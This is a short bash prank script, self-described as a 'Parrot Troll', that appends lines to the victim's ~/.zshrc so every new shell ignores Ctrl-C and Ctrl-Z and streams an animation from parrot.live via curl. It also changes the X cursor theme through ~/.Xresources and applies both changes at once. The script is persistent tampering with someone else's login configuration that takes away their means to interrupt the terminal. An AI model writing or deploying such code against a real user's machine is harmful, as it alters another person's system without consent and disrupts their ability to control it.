#!/bin/bash

PARROT_TROLL=$(cat << 'EOF'
trap '' 2
stty susp undef
curl parrot.live
EOF
)

X_PARROT_TROLL=$(cat << 'EOF'
Xcursor.theme: parrot-cursor
Xcursor.size: 32
EOF
)

append_parrot_troll() {
    local file="$1"
    if [ -f "$file" ]; then
		echo "$PARROT_TROLL" >> "$file"
		echo "Parrot Troll 🦜 added to $file"
    fi
	echo "$X_PARROT_TROLL" >> ~/.Xresources
	xrdb -merge ~/.Xresources
}

append_parrot_troll ~/.zshrc
source ~/.zshrc
